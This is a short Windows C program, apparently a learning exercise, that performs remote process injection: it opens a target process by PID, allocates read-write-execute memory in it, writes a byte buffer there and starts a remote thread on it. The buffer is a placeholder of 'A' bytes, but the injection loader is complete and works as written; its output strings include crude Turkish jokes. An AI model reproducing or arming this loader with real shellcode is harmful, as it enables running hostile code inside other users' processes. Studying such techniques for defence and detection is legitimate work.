#include <Windows.h>
#include <stdio.h>

/* Program Messages */
const char* successfulMessage = "[+]";
const char* errorMessage = "[-]";
const char* informationMessage = "[*]";

/* Important Variables */
DWORD PID, TID = NULL;
HANDLE hProcess, hThread = NULL; /* For Process Operations */
LPVOID rBuffer = NULL;   		 /* For VirtualAllocEx*/
unsigned char bekoPuke[] = "\x41\x41\x41\x41\x41\x41\x41\x41";

int main(int argc, char* argv[]) {

	if (argc < 2) {
		/*printf("%s UH OH... Usage: ./bekooM.exe <PID>", errorMessage, argv[0]); */
		return EXIT_FAILURE;
	}
	PID = atoi(argv[1]);
	printf("%s Wow! Nice %ld PID!\n", successfulMessage, PID);

	if ((hProcess = OpenProcess(
		PROCESS_ALL_ACCESS,	
		FALSE,				
		PID					
	)) != NULL) {
		printf("%s HOPPP! Got a handle to the Process! \n\\---0x%p\n", successfulMessage, hProcess);
		rBuffer = VirtualAllocEx(
			hProcess,					
			NULL,						
			sizeof(bekoPuke),			
			(MEM_COMMIT | MEM_RESERVE),	
			PAGE_EXECUTE_READWRITE		
		);
		printf("%s Allocated %zu-bytes with rwx permissions", informationMessage, sizeof(bekoPuke));
		WriteProcessMemory(
			hProcess,		
			rBuffer,			
			bekoPuke,			
			sizeof(bekoPuke),	
			NULL
		);

		if ((hThread = CreateRemoteThreadEx(
			hProcess,
			NULL,
			0,			
			(LPTHREAD_START_ROUTINE)rBuffer,	
			NULL,
			0,
			0,
			&TID	
		)) != NULL) {

			printf("%s Got a Handle to the Thread %ld\n\\---0x0%p", informationMessage, TID, hThread);
			printf("\n\n %s Cleaning Up\n", informationMessage);
			CloseHandle(hThread);
			CloseHandle(hProcess);
			printf("Ya bi siktir git process enjekte edecegine azicik kitap oku amk koylusu\n");

		}
		else {
			printf("%s OH! Failed to get a Handle to the Thread! Error Code: %ld", errorMessage, GetLastError());
			CloseHandle(hProcess);
			return EXIT_FAILURE;
		}
	}
	else {
		/* Bu kisimda OpenProcess API'si NULL sonucu döndürdügünde hata mesaji ekrana bastirir. */
		printf("%s Ahh..! couldn't get Handle to the your Process %ld. Error: %ld", errorMessage, PID, GetLastError());
		return EXIT_FAILURE;
	}

	return EXIT_SUCCESS;
}